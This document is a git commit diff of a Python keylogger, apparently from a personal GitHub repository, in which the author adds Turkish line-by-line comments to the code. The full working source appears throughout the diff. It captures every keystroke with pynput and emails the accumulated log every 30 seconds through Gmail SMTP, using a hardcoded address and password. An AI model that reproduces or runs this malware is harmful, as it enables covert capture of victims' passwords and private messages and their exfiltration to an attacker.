ede821ae1d3b902fd43071d5a60bdc2c84c96cab
songül kızılay <44816982+SongulKizilay@users.noreply.github.com>
2021-04-22 17:07:35 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,39 +1,38 @@
-import pynput.keyboard
-import smtplib
-import threading
+import pynput.keyboard #pynboard modülündeki keyboard modülünü yükledik
+import smtplib # smtplib modülünü yükleme mail modülü
+import threading # modül ekledik
 
-log = ""
+log = "" # log adına bir string oluşturduk 
 
-def callback_function(key):
+def callback_function(key): # klavyede basılan tuş hareketlerii  yollıcak
     global log
     try:
-        log = log + key.char.encode("utf-8")
+        log = log + key.char.encode("utf-8") #türkçe karektere uyumlu olmak için utf8 kullandık
         #log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
+    except AttributeError:#bu hata ile karşılaşırsan 
+        if key == key.space: # eğer space e baslıysa 
+            log = log + " " # boşluk bırak
         else:
-            log = log + str(key)
+            log = log + str(key) # keyleri stringe çevir 
+    print(log) # logu yazdır
 
-    print(log)
-
-def send_email(email,password,message):
-    email_server = smtplib.SMTP("smtp.gmail.com",587)
-    email_server.starttls()
-    email_server.login(email,password)
-    email_server.sendmail(email,email,message)
-    email_server.quit()
+def send_email(email,password,message): # email yollama
+    email_server = smtplib.SMTP("smtp.gmail.com",587) # hosta gmail kullandığımızı söyledik ve  gamilin portunu belirttik 
+    email_server.starttls()# starttls komutu siteyi açıyor
+    email_server.login(email,password)#bağlantı veriyor email ve şifreyle
+    email_server.sendmail(email,email,message)# emaili yolluyor 
+    email_server.quit()# maili kapadık
 
 #thread - threading
 
-def thread_function():
-    global log
-    send_email("blackouthacktesting@gmail.com", "testtest123456", log)
+def thread_function(): #yeni fonksyion oluşturduk 
+    global log  # log stringini kullanmak için global ekledik 
+    send_email("blackouthacktesting@gmail.com", "testtest123456", log)  #gönderliecek email adresi
     log = ""
-    timer_object = threading.Timer(30,thread_function)
-    timer_object.start()
+    timer_object = threading.Timer(30,thread_function)#timer objesi ouşturduk 30 saniyede bir mail göndericek
+    timer_object.start() # time objecti başlatıcak 
 
-keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)# bir paket geldiğinde bir fonksiyona o paketi işlemesi için yollar
 with keylogger_listener:
-    thread_function()
-    keylogger_listener.join()
+    thread_function() # thread functionu çağırdık 
+    keylogger_listener.join() # keylogger listenerı başlatıyor 
